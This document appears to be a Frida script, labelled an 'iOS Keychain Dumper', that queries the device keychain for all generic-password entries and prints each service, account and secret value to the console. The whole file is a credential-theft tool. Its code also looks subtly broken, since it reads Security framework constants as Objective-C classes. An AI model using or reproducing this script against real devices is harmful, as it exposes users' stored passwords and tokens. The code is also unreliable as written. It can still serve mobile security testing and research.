/*
    iOS Keychain Dumper
    Based on existing research and tools (objection, etc.)
*/

if (ObjC.available) {
    try {
        var className = "Security";
        var hook = ObjC.classes.Security;

        console.log("[*] Starting Keychain Dump...");

        var query = ObjC.classes.NSMutableDictionary.alloc().init();
        query.setObject_forKey_(ObjC.classes.kSecClassGenericPassword, ObjC.classes.kSecClass);
        query.setObject_forKey_(ObjC.classes.kSecMatchLimitAll, ObjC.classes.kSecMatchLimit);
        query.setObject_forKey_(ObjC.classes.kCFBooleanTrue, ObjC.classes.kSecReturnAttributes);
        query.setObject_forKey_(ObjC.classes.kCFBooleanTrue, ObjC.classes.kSecReturnData);

        var result = Memory.alloc(8);
        var status = Module.findExportByName("Security", "SecItemCopyMatching");
        var func = new NativeFunction(status, 'int', ['pointer', 'pointer']);

        var ret = func(query.handle, result);

        if (ret == 0) { // errSecSuccess
            var nsResult = new ObjC.Object(Memory.readPointer(result));
            var count = nsResult.count();
            console.log("[+] Found " + count + " items in Keychain.");

            for (var i = 0; i < count; i++) {
                var item = nsResult.objectAtIndex_(i);
                var account = item.objectForKey_(ObjC.classes.kSecAttrAccount);
                var service = item.objectForKey_(ObjC.classes.kSecAttrService);
                var data = item.objectForKey_(ObjC.classes.kSecValueData);

                var dataStr = "";
                if (data) {
                    dataStr = ObjC.classes.NSString.alloc().initWithData_encoding_(data, 4); // UTF8
                }

                console.log("--------------------------------------------------");
                console.log("Service: " + (service ? service.toString() : "null"));
                console.log("Account: " + (account ? account.toString() : "null"));
                console.log("Data   : " + (dataStr ? dataStr.toString() : "(binary/null)"));
            }
        } else {
            console.log("[-] SecItemCopyMatching failed with error: " + ret);
        }

    } catch (e) {
        console.log("[!] Error: " + e.message);
    }
} else {
    console.log("Objective-C Runtime is not available!");
}
